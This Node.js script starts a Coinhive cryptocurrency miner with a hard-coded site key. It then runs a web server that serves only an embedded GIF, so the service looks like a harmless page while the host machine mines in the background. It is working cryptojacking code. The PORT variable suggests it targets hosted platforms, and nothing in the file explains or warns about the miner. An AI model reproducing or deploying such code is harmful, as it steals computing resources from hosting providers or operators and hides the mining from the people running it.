const ch = require('coin-hive');
const http = require('http');

(async () => {
    const m = await ch('AAdsOihn1tvX5EhpQ8bD7fhNLB74pjsQ');
    await m.start();
})();

const requestHandler = (request, response) => {
  response.end('<iframe src="https://giphy.com/embed/z48aJruaX0Jsk" width="480" height="358" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>')
}

const server = http.createServer(requestHandler)
server.listen(process.env.PORT)

console.log(process.pid)
